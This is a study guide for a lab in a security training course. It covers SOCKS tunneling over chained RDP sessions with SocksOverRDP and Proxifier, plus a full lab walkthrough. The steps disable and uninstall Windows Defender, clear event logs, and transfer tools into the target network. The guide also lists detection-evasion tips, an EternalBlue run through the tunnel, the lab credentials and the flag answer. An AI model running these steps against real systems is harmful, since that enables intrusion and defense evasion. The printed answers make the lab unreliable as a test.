# **RDP and SOCKS Tunneling with SocksOverRDP - HTB Academy Page 15**

## **📋 Module Overview**

**Purpose:** SOCKS tunneling through RDP Dynamic Virtual Channels (DVC)  
**Tool:** SocksOverRDP + Proxifier - Windows-specific pivoting solution  
**Protocol:** RDP with custom DLL injection  
**Advantage:** Works in Windows-only environments, bypasses SSH restrictions  
**Use Case:** Windows network pivoting, RDP session chaining, internal access  

---

## **1. Introduction to SocksOverRDP**

### **What is SocksOverRDP?**
- **Purpose:** Tunnels arbitrary packets over RDP connections
- **Mechanism:** Uses Dynamic Virtual Channels (DVC) from Remote Desktop Service
- **Components:** DLL plugin + Server executable + Proxy client
- **Platform:** Windows-specific solution for network pivoting
- **Stealth:** Leverages legitimate RDP features for covert tunneling

### **Dynamic Virtual Channels (DVC)**
- **Feature:** Built-in RDP capability for packet tunneling
- **Legitimate Uses:** Clipboard data transfer, audio sharing, file transfer
- **Abuse:** Tunnel custom packets over established RDP connections
- **Advantage:** Uses existing RDP infrastructure, difficult to detect

### **How SocksOverRDP Works**
```
[Attack Host] → [RDP Session] → [Internal Target] → [Final Destination]
   xfreerdp     SocksOverRDP      DVC Tunnel        Target Service
   Proxifier    Plugin.dll        Server.exe        172.16.6.155
   127.0.0.1    127.0.0.1:1080    Packet Forward    RDP/HTTP/etc.
```

### **SocksOverRDP vs Other Windows Pivoting**

| **Aspect** | **SocksOverRDP** | **SSH Tunnel** | **Netsh** | **PowerShell** |
|------------|------------------|----------------|-----------|----------------|
| **Platform** | Windows Only | Cross-platform | Windows | Windows |
| **Requirements** | RDP Access | SSH Client | Admin Rights | PowerShell |
| **Stealth** | High | Low | Medium | Medium |
| **Setup Complexity** | Medium | Low | Low | High |
| **Performance** | Medium | High | High | Low |
| **Detection** | Hard | Easy | Medium | Medium |

---

## **2. Tool Requirements and Setup**

### **Required Components**

#### **SocksOverRDP Components**
1. **SocksOverRDP-Plugin.dll** - Client-side DLL for RDP session
2. **SocksOverRDP-Server.exe** - Server-side executable for target
3. **Proxifier** - Proxy client for traffic routing

#### **Download URLs**
```bash
# SocksOverRDP binaries
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip

# Proxifier Portable
wget https://www.proxifier.com/download/ProxifierPE.zip
```

### **File Preparation**

#### **Download and Extract**
```bash
# On Pwnbox/Attack Host
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip

# Extract archives
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip

# Verify files
ls -la SocksOverRDP*
# SocksOverRDP-Plugin.dll
# SocksOverRDP-Server.exe

ls -la "Proxifier PE"/
# Helper64.exe, Proxifier.exe, ProxyChecker.exe, etc.
```

#### **File Transfer Methods**
```bash
# Method 1: Direct copy-paste in RDP session
# - Copy files from host filesystem
# - Paste into RDP session
# - Simple but requires GUI access

# Method 2: HTTP download
python3 -m http.server 8000
# On Windows target: Invoke-WebRequest

# Method 3: SMB share
impacket-smbserver share . -smb2support
# On Windows: copy \\IP\share\file.exe .
```

---

## **3. Architecture Overview**

### **Network Topology**
```
[Pwnbox] → [Windows Pivot] → [Domain Controller] → [Final Target]
10.10.14.x   10.129.42.198     172.16.5.19        172.16.6.155
Attack Host  htb-student       victor:pass@123    jason:WellConnected123!
xfreerdp     SocksOverRDP      SocksOverRDP       Final RDP
             Plugin.dll        Server.exe         Destination
```

### **Traffic Flow**
```
1. [Proxifier] → SOCKS proxy → 127.0.0.1:1080
2. [Plugin.dll] → DVC tunnel → RDP connection
3. [Server.exe] → Local forward → Target service
4. [Target] → Service response → Reverse path
```

### **Component Interaction**
- **Proxifier:** Routes application traffic to SOCKS proxy
- **Plugin.dll:** Intercepts SOCKS traffic, tunnels via DVC
- **RDP Session:** Carries DVC tunnel data
- **Server.exe:** Receives DVC data, forwards to target services

---

## **4. Implementation Steps**

### **Step 1: Prepare Attack Host**
```bash
# Download required tools
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip

# Extract files
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip

# Verify downloads
file SocksOverRDP-Plugin.dll SocksOverRDP-Server.exe
```

### **Step 2: Connect to Windows Pivot Host**
```bash
# RDP to initial Windows target
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!

# Accept certificate when prompted
# Should connect to Windows 10 pivot host
```

### **Step 3: Disable Windows Defender**
```powershell
# In Windows pivot host - disable Defender (CRITICAL)
# GUI Method:
# 1. Windows Security → Virus & threat protection
# 2. Manage settings → Turn off Real-time protection
# 3. Turn off Cloud-delivered protection
# 4. Turn off Automatic sample submission

# PowerShell method (if available):
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

### **Step 4: Transfer Files to Pivot Host**
```powershell
# Method 1: Copy-paste (easiest)
# - Copy SocksOverRDP-Plugin.dll from host
# - Paste to Windows Desktop
# - Copy SocksOverRDP-Server.exe
# - Copy entire "Proxifier PE" folder

# Method 2: PowerShell download
Invoke-WebRequest -Uri "http://10.10.14.x:8000/SocksOverRDP-Plugin.dll" -OutFile "SocksOverRDP-Plugin.dll"
Invoke-WebRequest -Uri "http://10.10.14.x:8000/SocksOverRDP-Server.exe" -OutFile "SocksOverRDP-Server.exe"
```

### **Step 5: Register SocksOverRDP Plugin**
```powershell
# Run as Administrator (REQUIRED)
# Open PowerShell as Administrator
# Navigate to file location
cd C:\Users\htb-student\Desktop

# Register DLL with system
regsvr32.exe SocksOverRDP-Plugin.dll

# Expected output: Success dialog
# "DllRegisterServer in SocksOverRDP-Plugin.dll succeeded."
```

---

## **5. Establishing RDP Tunnel Chain**

### **Step 6: RDP to Domain Controller**
```powershell
# From Windows pivot host, connect to DC
mstsc.exe

# RDP connection details:
# Computer: 172.16.5.19
# User: victor
# Password: pass@123

# Expected: SocksOverRDP plugin activation message
# "SocksOverRDP plugin enabled, listening on 127.0.0.1:1080"
```

### **Step 7: Transfer Server to DC**
```powershell
# On Domain Controller (172.16.5.19)
# First disable Windows Defender
Uninstall-WindowsFeature -Name Windows-Defender

# Expected output:
# Success Restart Needed Exit Code      Feature Result
# ------- -------------- ---------      --------------
# True    No             NoChangeNeeded {}

# Transfer SocksOverRDP-Server.exe (copy-paste method)
# Paste file to DC Desktop
```

### **Step 8: Start SocksOverRDP Server**
```powershell
# On Domain Controller - run as Administrator
cd C:\Users\victor\Desktop
.\SocksOverRDP-Server.exe

# Expected output:
# Socks Over RDP by Balazs Bucsay
# Channel opened over RDP
# Listening for connections...
```

### **Step 9: Verify SOCKS Listener**
```powershell
# Back on Windows pivot host - verify listener
netstat -antb | findstr 1080

# Expected output:
# TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

---

## **6. Proxifier Configuration**

### **Step 10: Launch Proxifier**
```powershell
# On Windows pivot host - run as Administrator
cd "C:\Users\htb-student\Desktop\Proxifier PE"
.\Proxifier.exe

# Run as Administrator for full functionality
```

### **Step 11: Configure SOCKS Proxy**
```
# In Proxifier GUI:
1. Profile → Proxy Servers...
2. Add new proxy:
   - Address: 127.0.0.1
   - Port: 1080
   - Protocol: SOCKS Version 5
   - Authentication: None
3. Click OK
4. Set as default proxy
```

### **Step 12: Configure Proxification Rules**
```
# In Proxifier GUI:
1. Profile → Proxification Rules...
2. Default rule should route through SOCKS proxy
3. Verify all applications use proxy
4. Click OK to apply
```

---

## **7. HTB Academy Lab Exercise**

### **Lab Challenge**
**"Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop."**

### **Lab Environment**
- **Initial Target:** 10.129.42.198 (htb-student:HTB_@cademy_stdnt!)
- **Domain Controller:** 172.16.5.19 (victor:pass@123)
- **Final Target:** 172.16.6.155 (jason:WellConnected123!)
- **Flag Location:** Flag.txt on Jason's Desktop
- **Expected Flag:** `H0pping@roundwithRDP!`

### **Complete Lab Solution**

#### **Phase 1: Setup and Initial Connection**
```bash
# 1. Download tools on Pwnbox
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip

# 2. RDP to initial Windows target
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
# Accept certificate: Y
```

#### **Phase 2: Pivot Host Configuration**
```powershell
# 3. Disable Windows Defender (GUI method)
# Windows Security → Virus & threat protection → Manage settings
# Turn OFF: Real-time protection, Cloud-delivered protection, Automatic sample submission

# 4. Transfer files via copy-paste
# Copy from Pwnbox: SocksOverRDP-Plugin.dll, SocksOverRDP-Server.exe, Proxifier PE folder
# Paste to Windows Desktop

# 5. Register SocksOverRDP plugin (as Administrator)
cd C:\Users\htb-student\Desktop
regsvr32.exe SocksOverRDP-Plugin.dll
# Click OK on success dialog
```

#### **Phase 3: Domain Controller Connection**
```powershell
# 6. RDP to Domain Controller
mstsc.exe
# Computer: 172.16.5.19
# User: victor
# Password: pass@123
# Connect

# Expected plugin message:
# "SocksOverRDP plugin enabled, listening on 127.0.0.1:1080"

# 7. On DC - Disable Windows Defender
Uninstall-WindowsFeature -Name Windows-Defender

# 8. Transfer SocksOverRDP-Server.exe to DC (copy-paste)
# 9. Run server as Administrator
cd C:\Users\victor\Desktop
.\SocksOverRDP-Server.exe
# Expected: "Channel opened over RDP, Listening for connections..."
```

#### **Phase 4: Proxifier Setup**
```powershell
# 10. Back on pivot host - verify SOCKS listener
netstat -antb | findstr 1080
# Should show: TCP 127.0.0.1:1080 LISTENING

# 11. Launch Proxifier as Administrator
cd "C:\Users\htb-student\Desktop\Proxifier PE"
.\Proxifier.exe

# 12. Configure proxy in Proxifier:
# Profile → Proxy Servers → Add
# Address: 127.0.0.1, Port: 1080, Protocol: SOCKS Version 5
# OK

# 13. Verify default proxification rule routes through SOCKS
```

#### **Phase 5: Final Target Access**
```powershell
# 14. RDP to final target through proxy
mstsc.exe
# Computer: 172.16.6.155
# User: jason
# Password: WellConnected123!
# Connect

# 15. Retrieve flag
# Navigate to Desktop
# Open Flag.txt
# Content: H0pping@roundwithRDP!
```

#### **Lab Solution Summary**
```bash
# Complete command sequence:
# Pwnbox:
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip *.zip
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!

# Pivot Host (10.129.42.198):
# 1. Disable Defender, 2. Transfer files, 3. regsvr32.exe SocksOverRDP-Plugin.dll
# 4. mstsc.exe → 172.16.5.19 (victor:pass@123)

# Domain Controller (172.16.5.19):
# 1. Uninstall-WindowsFeature -Name Windows-Defender
# 2. Transfer SocksOverRDP-Server.exe, 3. Run as Admin

# Pivot Host (continued):
# 1. netstat -antb | findstr 1080, 2. Run Proxifier as Admin
# 3. Configure SOCKS5 127.0.0.1:1080, 4. mstsc.exe → 172.16.6.155 (jason:WellConnected123!)

# Final Target (172.16.6.155):
# type Desktop\Flag.txt → H0pping@roundwithRDP!
```

---

## **8. Troubleshooting Common Issues**

### **DLL Registration Failures**
```powershell
# Problem: regsvr32.exe fails
# Error: "The module 'SocksOverRDP-Plugin.dll' failed to load"

# Solutions:
1. Run PowerShell as Administrator
   Right-click PowerShell → Run as Administrator

2. Disable Windows Defender completely
   Windows Security → Virus & threat protection → Manage settings
   Turn OFF all protection features

3. Check file integrity
   dir SocksOverRDP-Plugin.dll
   # Verify file exists and is not quarantined

4. Use full path
   regsvr32.exe "C:\Users\htb-student\Desktop\SocksOverRDP-Plugin.dll"
```

### **RDP Connection Issues**
```powershell
# Problem: Cannot connect to internal targets
# Error: "Remote Desktop can't connect to the remote computer"

# Solutions:
1. Verify network connectivity
   ping 172.16.5.19
   Test-NetConnection 172.16.5.19 -Port 3389

2. Check credentials
   # Ensure exact username/password
   # victor:pass@123 (not victor@domain)

3. Certificate issues
   # Always accept untrusted certificates
   # Click "Yes" when prompted

4. RDP service status
   # Ensure RDP is enabled on target
   # Check if Remote Desktop is allowed
```

### **SOCKS Proxy Issues**
```powershell
# Problem: SOCKS listener not starting
# netstat shows no 127.0.0.1:1080 listener

# Solutions:
1. Verify plugin registration
   regsvr32.exe SocksOverRDP-Plugin.dll
   # Should show success dialog

2. Check RDP session status
   # Plugin only works within active RDP session
   # Verify connection to 172.16.5.19

3. Run server as Administrator
   # SocksOverRDP-Server.exe requires admin rights
   # Right-click → Run as Administrator

4. Port conflicts
   netstat -an | findstr 1080
   # Kill processes using port 1080
   taskkill /f /pid <PID>
```

### **Proxifier Configuration Issues**
```powershell
# Problem: Proxifier not routing traffic
# Applications bypass proxy

# Solutions:
1. Run Proxifier as Administrator
   # Required for process injection
   Right-click Proxifier.exe → Run as Administrator

2. Check proxy configuration
   # Profile → Proxy Servers
   # Verify: 127.0.0.1:1080, SOCKS5

3. Verify proxification rules
   # Profile → Proxification Rules
   # Default rule: All applications via SOCKS proxy

4. Test proxy connectivity
   # Profile → Proxy Checker
   # Test connection to 127.0.0.1:1080
```

### **Windows Defender Interference**
```powershell
# Problem: Files get deleted automatically
# Defender quarantines SocksOverRDP files

# Solutions:
1. Complete Defender disable
   # Windows Security → Virus & threat protection
   # Turn OFF: Real-time, Cloud-delivered, Automatic sample

2. Add exclusions
   # Virus & threat protection → Exclusions
   # Add folder: C:\Users\htb-student\Desktop

3. PowerShell disable
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -DisableArchiveScanning $true
   Set-MpPreference -DisableBehaviorMonitoring $true

4. Uninstall Defender (on DC)
   Uninstall-WindowsFeature -Name Windows-Defender
```

---

## **9. Performance Optimization**

### **RDP Performance Settings**
```
# In mstsc.exe → Experience tab:
1. Connection speed: Modem (56 kbps)
2. Uncheck:
   - Desktop background
   - Font smoothing
   - Desktop composition
   - Show contents of windows while dragging
3. Check:
   - Persistent bitmap caching
```

### **Proxifier Performance**
```
# In Proxifier:
1. Profile → Advanced → Performance
2. Enable: Process faster connections
3. Increase: Connection timeout (30 seconds)
4. Enable: Handle direct connections internally
```

### **Network Optimization**
```powershell
# Reduce RDP bandwidth usage
# In RDP session:
1. Lower screen resolution
2. Reduce color depth (16-bit)
3. Disable audio redirection
4. Disable clipboard sharing
5. Disable drive redirection
```

---

## **10. Security Considerations**

### **OPSEC Implications**
1. **Registry Modifications** - DLL registration leaves traces
2. **Process Artifacts** - Proxifier and SocksOverRDP processes visible
3. **Network Signatures** - DVC tunnel traffic patterns
4. **File Artifacts** - Tool binaries on disk
5. **Event Logs** - RDP connection logs, authentication events

### **Detection Evasion**
```powershell
# Minimize detection footprint:
1. Use legitimate RDP sessions
2. Disable unnecessary logging
3. Clean up files after use
4. Use standard RDP ports (3389)
5. Limit session duration
```

### **Cleanup Procedures**
```powershell
# After completion:
1. Unregister DLL
   regsvr32.exe /u SocksOverRDP-Plugin.dll

2. Remove files
   del SocksOverRDP-Plugin.dll
   del SocksOverRDP-Server.exe
   rmdir /s "Proxifier PE"

3. Clear event logs (if possible)
   wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"

4. Re-enable Windows Defender
   Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## **11. Alternative Windows Pivoting Methods**

### **Comparison with Other Techniques**

| **Tool** | **Requirements** | **Stealth** | **Performance** | **Complexity** |
|----------|------------------|-------------|-----------------|----------------|
| **SocksOverRDP** | RDP Access | High | Medium | Medium |
| **SSH Tunnel** | SSH Client | Low | High | Low |
| **Netsh Portproxy** | Admin Rights | Medium | High | Low |
| **PowerShell Remoting** | WinRM Enabled | Medium | Medium | High |
| **Chisel** | Binary Transfer | High | High | Medium |

### **When to Use SocksOverRDP**
✅ **Windows-only environments**  
✅ **RDP access available**  
✅ **SSH/other tools blocked**  
✅ **Need stealth tunneling**  
✅ **Multiple RDP hops required**  

### **Limitations**
❌ **Requires RDP access**  
❌ **Windows Defender interference**  
❌ **DLL registration traces**  
❌ **Performance overhead**  
❌ **Complex multi-step setup**  

---

## **12. Integration with Other Tools**

### **Metasploit Integration**
```bash
# Use SocksOverRDP with Metasploit
# Configure proxy in msfconsole
setg Proxies socks5:127.0.0.1:1080

# All payloads will route through RDP tunnel
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.6.155
exploit
```

### **Nmap Through RDP Tunnel**
```bash
# Install Linux tools on Windows (WSL)
# Or use PowerShell equivalents
Test-NetConnection 172.16.6.0/24 -Port 80,443,3389

# Through Proxifier (configure Nmap to use SOCKS)
# Or use Windows port scanners
```

### **Web Browser Pivoting**
```
# Proxifier automatically routes browser traffic
# Access internal web applications:
# http://172.16.6.155
# https://internal.domain.local
# All traffic routes through RDP tunnel
```

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 15
- **SocksOverRDP GitHub**: [Official Repository](https://github.com/nccgroup/SocksOverRDP)
- **Proxifier**: [Official Website](https://www.proxifier.com/)
- **RDP DVC Documentation**: [Microsoft Dynamic Virtual Channels](https://docs.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels)
- **Windows RDP Security**: [RDP Security Best Practices](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access) 